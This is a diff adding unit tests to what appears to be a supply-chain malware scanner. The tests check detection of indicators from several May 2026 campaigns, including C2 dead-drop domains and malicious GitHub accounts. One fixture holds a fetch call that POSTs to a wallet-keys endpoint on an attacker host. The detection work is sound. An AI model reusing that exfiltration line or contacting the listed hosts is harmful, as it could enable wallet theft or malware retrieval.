@@ -1505,4 +1505,92 @@ describe("Campaign Signatures", () => {
       expect(finding?.severity).toBe("critical");
     });
   });
+
+  // =================================================================
+  // TrapDoor cross-ecosystem credential stealer (May 25, 2026)
+  // =================================================================
+
+  describe("TrapDoor Cross-Ecosystem (May 2026)", () => {
+    it("should detect ddjidd564.github.io C2 dead-drop domain", async () => {
+      fs.writeFileSync(
+        path.join(tempDir, "fetch.js"),
+        'const c2 = "https://ddjidd564.github.io/payload.json";'
+      );
+
+      const report = await scan({ target: tempDir, format: "text" });
+      const finding = report.findings.find(
+        (f) => f.rule === "IOC_KNOWN_C2_DOMAIN"
+      );
+      expect(finding).toBeDefined();
+      expect(finding?.severity).toBe("critical");
+    });
+
+    it("should detect ddjidd564 attacker GitHub account reference", async () => {
+      fs.writeFileSync(
+        path.join(tempDir, "loader.js"),
+        'const url = "https://github.com/ddjidd564/trapdoor";'
+      );
+
+      const report = await scan({ target: tempDir, format: "text" });
+      const finding = report.findings.find(
+        (f) => f.rule === "IOC_KNOWN_MALICIOUS_ACCOUNT"
+      );
+      expect(finding).toBeDefined();
+      expect(finding?.severity).toBe("critical");
+    });
+  });
+
+  // =================================================================
+  // Polymarket impersonation typosquat publisher (May 22, 2026)
+  // =================================================================
+
+  describe("Polymarket Typosquat (May 2026)", () => {
+    it("should detect polymarketbot.polymarketdev.workers.dev exfiltration domain", async () => {
+      fs.writeFileSync(
+        path.join(tempDir, "stealer.js"),
+        'await fetch("https://polymarketbot.polymarketdev.workers.dev/v1/wallets/keys", { method: "POST" });'
+      );
+
+      const report = await scan({ target: tempDir, format: "text" });
+      const finding = report.findings.find(
+        (f) => f.rule === "IOC_KNOWN_C2_DOMAIN"
+      );
+      expect(finding).toBeDefined();
+      expect(finding?.severity).toBe("critical");
+    });
+
+    it("should detect polymarketdev malicious npm publisher", async () => {
+      fs.writeFileSync(
+        path.join(tempDir, "ref.js"),
+        'const repo = "https://github.com/polymarketdev/polymarket-trader";'
+      );
+
+      const report = await scan({ target: tempDir, format: "text" });
+      const finding = report.findings.find(
+        (f) => f.rule === "IOC_KNOWN_MALICIOUS_ACCOUNT"
+      );
+      expect(finding).toBeDefined();
+      expect(finding?.severity).toBe("critical");
+    });
+  });
+
+  // =================================================================
+  // Mini Shai-Hulud durabletask PyPI hijack (May 24, 2026)
+  // =================================================================
+
+  describe("Mini Shai-Hulud durabletask (May 2026)", () => {
+    it("should detect Megalodon throwaway GitHub accounts (rkb8el9r)", async () => {
+      fs.writeFileSync(
+        path.join(tempDir, "commit.js"),
+        'const author = "https://github.com/rkb8el9r";'
+      );
+
+      const report = await scan({ target: tempDir, format: "text" });
+      const finding = report.findings.find(
+        (f) => f.rule === "IOC_KNOWN_MALICIOUS_ACCOUNT"
+      );
+      expect(finding).toBeDefined();
+      expect(finding?.severity).toBe("critical");
+    });
+  });
 });
